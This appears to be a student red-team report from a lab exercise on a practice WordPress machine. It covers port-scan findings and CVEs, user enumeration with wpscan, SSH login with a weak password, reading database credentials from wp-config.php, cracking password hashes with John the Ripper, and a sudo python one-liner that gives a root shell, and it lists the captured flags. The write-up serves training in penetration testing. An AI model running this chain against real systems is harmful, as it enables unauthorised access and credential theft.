# Red Team: Summary of Operations

## Table of Contents
- Exposed Services
- Critical Vulnerabilities
- Exploitation

### Exposed Services


Nmap scan results for each machine reveal the below services and OS details:

```bash
$ nmap -sV 192.168.1.110 
```

![nmap Screenshot](https://github.com/johnny-atx/Final-Project/blob/master/Images/Final_Day1-2/target1_nmap_portscan.png)



This scan identifies the services below as potential points of entry:
 ### Target 1
  - **Port 80 http Apache 2.4.10**
> [CVE-2017-9798](https://nvd.nist.gov/vuln/detail/CVE-2017-9798) Apache httpd allows remote attackers to read secret data from process memory if the Limit directive can be set in a user's .htaccess file, or if httpd.conf has certain misconfigurations, aka Optionsbleed. The attacker sends an unauthenticated OPTIONS HTTP request when attempting to read secret data. This is a use-after-free issue and thus secret data is not always sent, and the specific data depends on many factors including configuration. 
 * **Port 111 rpc-bind**
> [CVE-2017-8779](https://nvd.nist.gov/vuln/detail/CVE-2017-8779) - Does not consider maximum RPC data size during memory allocation for XDR strings, allowing remote attackers to cause a denial of service via a crafted UDP packet via port 111, aka RPC bomb.
 - **Port 139, 445 netbios-ssn Samba smbd 3.x - 4.x**
 > [CVE-2016-2115](https://nvd.nist.gov/vuln/detail/CVE-2016-2115) - Samba 3.x and 4.x before 4.2.11, 4.3.x before 4.3.8, and 4.4.x before 4.4.2 does not require SMB signing within a DCERPC session over ncacn_np, which allows man-in-the-middle attackers to spoof SMB clients by modifying the client-server data stream.


### Exploitation to find Flags

The Red Team was able to penetrate _**Target 1**_ and retrieve the following confidential data:

 ### Flag 1 & 2

   - **Exploit Used**
      - `wpscan --url http://192.168.1.110/wordpress -e vp,u `
      - This returned usernames used to access Wordpress
      
![wpscan_user](https://github.com/johnny-atx/Final-Project/blob/master/Images/Final_Day1-2/wpscan_success_users.png)

      
   - Then ssh'd into Michaels account using: 
	      username: `michael@192.168.1.110` 
	      password: `michael` 
	      
![ssh@michael](https://github.com/johnny-atx/Final-Project/blob/master/Images/Final_Day1-2/ssh_michael.png)
      

   - **Directory exploration**
      - Accessed directory files to search for _flag1, 2.txt_
      - `find /var/www -iname flag*.txt -type f 2>dev/null`
      - `cd /var/www/html/wordpress`
        `grep -ir flag1`

`flag1.txt`:**`flag1{b9bbcb33e11b80be759c4e844862482d}`**
`flag2.txt`:**`flag2{fc3fd58dcdad9ab23faca6e9a36e581c}`**

![flag1-2.png](https://github.com/johnny-atx/Final-Project/blob/master/Images/Final_Day1-2/flag1-2.png)

- ### Flag 3 & 4
  - Located _wp-config.php_ file:
    - `/var/www.html$ find . -iname wp-config.php`
    - `/var/www.html.wordpress$ cat wp-config.php`
    - This file disclosed:
      ``DB_name: Wordpress``
      ``DB_user: root``
      ``DB_password: R@v3nSecurity``

![wp-config.php file](https://github.com/johnny-atx/Final-Project/blob/master/Images/Final_Day1-2/wp-config-dbpsswd.png)

 - Entered command to see all databases:
   - `SHOW tables;`
   -  `SELECT * FROM wp-posts;`
     `flag3.txt`:**`flag3{afc01ab56b50591e7dccf93122770cd2}`**
![Database.png](Link to .png file once you get it) 

![flag3.png](https://github.com/johnny-atx/Final-Project/blob/master/Images/Final_Day1-2/flag3-4_wp-post.png)

- Entered _wp_users_ database:
  - `SELECT * FROM wp_users;`
  - Copied user hash dump to _wp_hashes.txt_ and ran it through **John The Ripper**
  - `$john --wordlist=rockyou.txt wp_hashes.txt`
  - Discovered Stevens password: **pink84**

![Johns_Hash_crack.png](https://github.com/johnny-atx/Final-Project/blob/master/Images/Final_Day1-2/Johns_hash_crack.png)

- SSH into **Steven's** account using: 
	      username: `steven@192.168.1.110` 
	      password: `pink84` 
  - Escalated to root:
  - `$sudo python -c 'import os;os.system("usr/bin/sudo su root")'`
  - Gained root shell `root@Target1:/usr/bin#`	   
     
![pwnd_target1.png](https://github.com/johnny-atx/Final-Project/blob/master/Images/Final_Day1-2/pwnd_root.png)


`flag4.txt`:**`flag4{715dea6c055b9fe3337544932f2941ce}`**

<!--stackedit_data:
eyJoaXN0b3J5IjpbNjg5MTY1MDE2LDE2OTc5Njc4NDUsMTIwNj
E4MzEyNCwtNjc0NTM2MzY0LDkzMjY0NTQxMSwtODkxMzcwMjgw
LDE1NjU5MzY1MDksLTgyNjA4MjE3LDE0NDQ1MzM1NTAsLTM5Mj
kxNzMzMCw1MTQ2NzUyNjMsMTM5NTE0NjUxOSwtNTQ2NDI3ODYy
LDEzNDUxNDQyMjEsLTE2MTcwMjk0ODEsLTEzNzg5MTQ0MjVdfQ
==
-->